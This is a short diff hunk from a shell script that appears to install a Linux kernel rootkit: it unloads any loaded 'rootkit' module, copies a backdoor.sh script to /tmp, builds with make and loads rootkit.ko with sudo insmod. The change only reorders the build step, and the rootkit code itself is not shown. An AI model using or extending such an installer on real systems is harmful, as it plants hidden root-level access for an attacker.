@@ -8,9 +8,9 @@ if [ -n "$already" ]; then
     sudo rmmod rootkit
 fi
 
-make
-
 cp backdoor.sh /tmp/
+
+make
 
 if [ $? -eq 0 ]; then
 	sudo insmod rootkit.ko
